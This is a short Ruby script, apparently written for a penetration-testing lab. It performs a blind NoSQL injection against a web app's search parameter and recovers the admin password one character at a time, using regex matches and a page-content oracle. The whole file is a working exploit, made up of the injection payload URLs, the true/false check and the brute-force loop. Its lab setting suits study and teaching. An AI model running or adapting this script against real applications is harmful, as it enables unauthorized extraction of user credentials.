#We have two examples of what works and what doesn't as we can see what returns the admin page or not
#http://ptl-93ced0fc-2f108e05.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/aaa/)%00 doesn't work
#http://ptl-93ced0fc-2f108e05.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/d/)%00 works 

# Use a http library
require 'httparty' 
URL="ptl-93ced0fc-2f108e05.libcurl.so"
def check?(str)
# We need a way to tell the script this is false or true, we do this by giving it a constant on the correct page that isn't on the false, we can't use /admin/ as it's on both, however we can use >admin< which we got from the source code
	resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
# We need a way to tell the script this is false or true, we do this by giving it a constant on the correct page that isn't on the false, we can't use /admin/ as it's on both, however we can use >admin< which we got from the source code
       	return resp.body =~ />admin</
end
#Un-comment this and run this to confirm that the script does find the difference
#puts check?("d").inspect
#puts check?("aaa").inspect

#define the list of characters
CHARSET = ('a'..'f').to_a+('0'..'9').to_a+['-']
password = ""

while true
	CHARSET.each do |c|
		puts "Trying: #{c} for #{password}"
		test = password+c
# adding the ^ to confirm the start of the password and the .* for the proceeding characters
		if check?("^#{test}.*$")
			  password+=c
			  puts password
			  break
		end
	end
end
